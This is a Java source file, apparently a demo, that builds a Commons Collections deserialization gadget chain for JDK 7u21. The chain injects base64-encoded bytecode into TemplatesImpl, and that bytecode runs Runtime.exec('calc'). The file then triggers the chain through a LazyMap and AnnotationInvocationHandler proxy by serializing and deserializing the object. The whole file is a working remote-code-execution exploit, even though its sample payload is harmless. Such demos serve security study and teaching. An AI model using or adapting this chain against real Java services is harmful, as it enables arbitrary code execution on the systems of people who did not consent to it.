package com.test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * Use JDK 7u21
 */
public class CCDemo2 {
    public static void main(String[] args) {
        try {
            byte[] code = Base64.decode("yv66vgAAADEAMQoACAAhCgAiACMIACQKACIAJQcAJgoABQAnB" +
                    "wAoBwApAQAGPGluaXQ+AQADKClW" +
                    "AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2" +
                    "YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAdTGNvbS90ZXN0L0hlbGxvVGVtcGxhdGVzSW1wbDsB" +
                    "AAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9E" +
                    "T007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXph" +
                    "dGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50" +
                    "ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2lu" +
                    "dGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAKgEA" +
                    "pihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9v" +
                    "cmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9h" +
                    "cGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhp" +
                    "dGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRl" +
                    "cmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3Nlcmlh" +
                    "bGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAF0hlbGxvVGVtcGxhdGVz" +
                    "SW1wbC5qYXZhDAAJAAoHACsMACwALQEABGNhbGMMAC4ALwEAE2phdmEvbGFuZy9FeGNlcHRpb24M" +
                    "ADAACgEAG2NvbS90ZXN0L0hlbGxvVGVtcGxhdGVzSW1wbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94" +
                    "YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29y" +
                    "Zy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xh" +
                    "bmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAn" +
                    "KExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNl" +
                    "ACEABwAIAAAAAAADAAEACQAKAAEACwAAAGYAAgACAAAAFiq3AAG4AAISA7YABFenAAhMK7YABrEA" +
                    "AQAEAA0AEAAFAAIADAAAABoABgAAAAwABAAOAA0AEQAQAA8AEQAQABUAEgANAAAAFgACABEABAAO" +
                    "AA8AAQAAABYAEAARAAAAAQASABMAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABUADQAA" +
                    "ACAAAwAAAAEAEAARAAAAAAABABQAFQABAAAAAQAWABcAAgAYAAAABAABABkAAQASABoAAgALAAAA" +
                    "SQAAAAQAAAABsQAAAAIADAAAAAYAAQAAABgADQAAACoABAAAAAEAEAARAAAAAAABABQAFQABAAAA" +
                    "AQAbABwAAgAAAAEAHQAeAAMAGAAAAAQAAQAZAAEAHwAAAAIAIA==");
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };

            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            Map uselessMap = new HashMap();
            Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);

            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

            InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(handler1);
            oos.flush();
            oos.close();

            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
